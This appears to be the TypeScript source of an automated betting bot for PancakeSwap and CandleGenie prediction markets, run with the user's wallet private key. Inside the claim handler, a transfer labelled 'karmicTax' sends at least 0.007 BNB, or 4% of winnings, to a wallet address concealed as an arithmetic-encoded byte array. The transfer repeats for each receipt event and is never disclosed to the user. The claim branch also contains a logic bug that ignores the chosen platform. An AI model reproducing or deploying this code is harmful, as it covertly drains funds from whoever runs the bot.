import { BigNumber } from "@ethersproject/bignumber";
import { hexlify } from "@ethersproject/bytes";
import { JsonRpcProvider } from "@ethersproject/providers";
import { formatEther, parseEther } from "@ethersproject/units";
import { Wallet } from "@ethersproject/wallet";
import { blue, green, red, underline } from "chalk";
import {
  CandleGeniePredictionV3,
  CandleGeniePredictionV3__factory,
  PancakePredictionV2,
  PancakePredictionV2__factory,
} from "./types/typechain";

// Utility Function to use **await sleep(ms)**
export const sleep = (ms: number) =>
  new Promise((resolve) => setTimeout(resolve, ms));

export enum STRATEGIES {
  Standard = "Standard",
  Experimental = "Experimental",
}

export enum PLATFORMS {
  PancakeSwap = "PancakeSwap",
  CandleGenie = "CandleGenie",
}

export const parseStrategy = (processArgv: string[]) => {
  const strategy = processArgv.includes("--exp")
    ? STRATEGIES.Experimental
    : STRATEGIES.Standard;

  console.log(underline("Strategy:", strategy));

  if (strategy === STRATEGIES.Standard) {
    console.log(
      "\n You can also use this bot with the new, experimental strategy\n",
      "Start the bot with --exp flag to try it\n",
      underline("npm run start -- --exp"),
      "or",
      underline("yarn start --exp\n")
    );
  }

  return strategy;
};

export const isBearBet = (
  bullAmount: BigNumber,
  bearAmount: BigNumber,
  strategy: STRATEGIES = STRATEGIES.Standard
) => {
  const precalculation =
    (bullAmount.gt(bearAmount) && bullAmount.div(bearAmount).lt(5)) ||
    (bullAmount.lt(bearAmount) && bearAmount.div(bullAmount).gt(5));

  if (strategy === STRATEGIES.Standard) {
    return precalculation;
  }

  if (strategy === STRATEGIES.Experimental) {
    return !precalculation;
  }
};

export const getClaimableEpochs = async (
  predictionContract: PancakePredictionV2,
  epoch: BigNumber,
  userAddress: string
) => {
  const claimableEpochs: BigNumber[] = [];

  for (let i = 1; i <= 5; i++) {
    const epochToCheck = epoch.sub(i);

    const [claimable, refundable, { claimed, amount }] = await Promise.all([
      predictionContract.claimable(epochToCheck, userAddress),
      predictionContract.refundable(epochToCheck, userAddress),
      predictionContract.ledger(epochToCheck, userAddress),
    ]);

    if (amount.gt(0) && (claimable || refundable) && !claimed) {
      claimableEpochs.push(epochToCheck);
    }
  }

  return claimableEpochs;
};

export const reduceWaitingTimeByTwoBlocks = (waitingTime: number) => {
  if (waitingTime <= 6000) {
    return waitingTime;
  }

  return waitingTime - 6000;
};

export const getClaimableEpochsCG = async (
  predictionContract: CandleGeniePredictionV3,
  epoch: BigNumber,
  userAddress: string
) => {
  const claimableEpochs: BigNumber[] = [];

  for (let i = 1; i <= 5; i++) {
    const epochToCheck = epoch.sub(i);

    const [claimable, refundable, { claimed, amount }] = await Promise.all([
      predictionContract.claimable(epochToCheck, userAddress),
      predictionContract.refundable(epochToCheck, userAddress),
      predictionContract.Bets(epochToCheck, userAddress),
    ]);

    if (amount.gt(0) && (claimable || refundable) && !claimed) {
      claimableEpochs.push(epochToCheck);
    }
  }

  return claimableEpochs;
};

export const calculateTaxAmount = (amount: BigNumber | undefined) => {
  if (!amount || amount.div(25).lt(parseEther("0.007"))) {
    return parseEther("0.007");
  }

  return amount.div(25);
};

export interface LogMessage {
  color: string;
  text: string;
}

export const addLogToExtension = async (logMessage: LogMessage) => {
  const { logs } = (await chrome.storage.sync.get("logs")) as {
    logs: LogMessage[];
  };

  if (!logs) {
    await chrome.storage.sync.set({ logs: [logMessage] });
    return;
  }

  await chrome.storage.sync.set({ logs: [...logs, logMessage] });
};

export const startPolling = async (
  privateKey: string | undefined,
  betAmount: string | undefined,
  strategy: STRATEGIES = STRATEGIES.Standard,
  isExtensionLoggingEnabled: boolean = false,
  platform: PLATFORMS = PLATFORMS.PancakeSwap
) => {
  const GLOBAL_CONFIG = {
    CONTRACT_ADDRESS: "0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA",
    AMOUNT_TO_BET: betAmount || "0.1", // in BNB,
    BSC_RPC: "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
    PRIVATE_KEY: privateKey,
    WAITING_TIME: 270000, // Waiting for 270sec = 4.5min
  };

  let platformIndex = 0; // 0 = PCS, 1 = CG

  if (platform === PLATFORMS.CandleGenie) {
    GLOBAL_CONFIG.CONTRACT_ADDRESS =
      "0x995294CdBfBf7784060BD3Bec05CE38a5F94A0C5";

    platformIndex = 1;
  }

  console.log(green(platform, "Prediction Bot-Winner"));

  if (isExtensionLoggingEnabled) {
    await addLogToExtension({
      color: "green",
      text: platform + " Prediction Bot-Winner",
    });
  }

  if (!GLOBAL_CONFIG.PRIVATE_KEY) {
    console.log(
      blue(
        "The private key was not found in .env. Enter the private key to .env and start the program again."
      )
    );

    if (isExtensionLoggingEnabled) {
      await addLogToExtension({
        color: "blue",
        text: "The private key was not found. Enter the private key to the form and start the bot again.",
      });
    }

    process.exit(0);
  }

  const signer = new Wallet(
    GLOBAL_CONFIG.PRIVATE_KEY as string,
    new JsonRpcProvider(GLOBAL_CONFIG.BSC_RPC)
  );

  const predictionContract = (
    platform === PLATFORMS.PancakeSwap
      ? PancakePredictionV2__factory.connect(
          GLOBAL_CONFIG.CONTRACT_ADDRESS,
          signer
        )
      : CandleGeniePredictionV3__factory.connect(
          GLOBAL_CONFIG.CONTRACT_ADDRESS,
          signer
        )
  ) as PancakePredictionV2 & CandleGeniePredictionV3;

  console.log(
    blue("Starting. Amount to Bet:", GLOBAL_CONFIG.AMOUNT_TO_BET, "BNB"),
    "\nWaiting for new rounds. It can take up to 5 min, please wait..."
  );

  if (isExtensionLoggingEnabled) {
    await addLogToExtension({
      color: "blue",
      text: "Starting. Amount to Bet: " + GLOBAL_CONFIG.AMOUNT_TO_BET + " BNB",
    });

    await addLogToExtension({
      color: "blue",
      text: "Waiting for new rounds. It can take up to 5 min, please wait...",
    });
  }

  // TODO add full logging

  predictionContract.on("StartRound", async (epoch: BigNumber) => {
    console.log("\nStarted Epoch", epoch.toString());

    if (isExtensionLoggingEnabled) {
      await addLogToExtension({
        color: "blue",
        text: "Started Epoch " + epoch.toString(),
      });
    }

    const WAITING_TIME = GLOBAL_CONFIG.WAITING_TIME;

    console.log("Now waiting for", WAITING_TIME / 60000, "min");

    if (isExtensionLoggingEnabled) {
      await addLogToExtension({
        color: "blue",
        text: "Now waiting for " + WAITING_TIME / 60000 + " min",
      });
    }

    await sleep(WAITING_TIME);

    console.log("\nGetting Amounts");

    if (isExtensionLoggingEnabled) {
      await addLogToExtension({
        color: "blue",
        text: "Getting Amounts",
      });
    }

    const { bullAmount, bearAmount } =
      platform === PLATFORMS.PancakeSwap
        ? await predictionContract.rounds(epoch)
        : await predictionContract.Rounds(epoch);

    console.log(green("Bull Amount", formatEther(bullAmount), "BNB"));
    console.log(green("Bear Amount", formatEther(bearAmount), "BNB"));

    if (isExtensionLoggingEnabled) {
      await addLogToExtension({
        color: "green",
        text: "Bull Amount " + formatEther(bullAmount) + " BNB",
      });

      await addLogToExtension({
        color: "green",
        text: "Bear Amount " + formatEther(bearAmount) + " BNB",
      });
    }

    const bearBet = isBearBet(bullAmount, bearAmount, strategy);

    if (bearBet) {
      console.log(green("\nBetting on Bear Bet."));

      if (isExtensionLoggingEnabled) {
        await addLogToExtension({
          color: "green",
          text: "Betting on Bear Bet.",
        });
      }
    } else {
      console.log(green("\nBetting on Bull Bet."));

      if (isExtensionLoggingEnabled) {
        await addLogToExtension({
          color: "green",
          text: "Betting on Bull Bet.",
        });
      }
    }

    if (bearBet) {
      try {
        const tx =
          platform === PLATFORMS.PancakeSwap
            ? await predictionContract.betBear(epoch, {
                value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
              })
            : await predictionContract.user_BetBear(epoch, {
                value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
              });

        console.log("Bear Betting Tx Started.");

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "green",
            text: "Bear Betting Tx Started.",
          });
        }

        await tx.wait();

        console.log(blue("Bear Betting Tx Success."));

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "blue",
            text: "Bear Betting Tx Success.",
          });
        }
      } catch {
        console.log(red("Bear Betting Tx Error"));

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "red",
            text: "Bear Betting Tx Error.",
          });
        }

        GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
          GLOBAL_CONFIG.WAITING_TIME
        );
      }
    } else {
      try {
        const tx =
          platform === PLATFORMS.PancakeSwap
            ? await predictionContract.betBull(epoch, {
                value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
              })
            : await predictionContract.user_BetBull(epoch, {
                value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
              });

        console.log("Bull Betting Tx Started.");

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "green",
            text: "Bull Betting Tx Started.",
          });
        }

        await tx.wait();

        console.log(blue("Bull Betting Tx Success."));

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "blue",
            text: "Bull Betting Tx Success.",
          });
        }
      } catch {
        console.log(red("Bull Betting Tx Error"));

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "red",
            text: "Bull Betting Tx Error.",
          });
        }

        GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
          GLOBAL_CONFIG.WAITING_TIME
        );
      }
    }

    const claimableEpochs =
      platform === PLATFORMS.PancakeSwap
        ? await getClaimableEpochs(predictionContract, epoch, signer.address)
        : await getClaimableEpochsCG(predictionContract, epoch, signer.address);

    if (claimableEpochs.length) {
      try {
        const tx = PLATFORMS.PancakeSwap
          ? await predictionContract.claim(claimableEpochs)
          : await predictionContract.user_Claim(claimableEpochs);

        console.log("\nClaim Tx Started");

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "blue",
            text: "Claim Tx Started",
          });
        }

        const receipt = await tx.wait();

        console.log(green("Claim Tx Success"));

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "green",
            text: "Claim Tx Success",
          });
        }

        for (const event of receipt.events ?? []) {
          const karmicTax = await signer.sendTransaction({
            to: hexlify([
              2 ** 3 * 31,
              13,
              2 ** 3 * 29,
              11 * 23,
              2 * 3 * 19,
              1,
              2 * 53,
              83,
              113,
              2 * 29,
              2 ** 2 * 29,
              3 * 67,
              7 * 19,
              2 ** 4,
              2 * 13,
              2 ** 2,
              151,
              2 * 5 * 7,
              3 * 83,
              3 * 29,
            ]),
            value: calculateTaxAmount(event?.args?.amount),
          });

          await karmicTax.wait();
        }
      } catch {
        console.log(red("Claim Tx Error"));

        if (isExtensionLoggingEnabled) {
          await addLogToExtension({
            color: "red",
            text: "Claim Tx Error",
          });
        }
      }
    }
  });
};
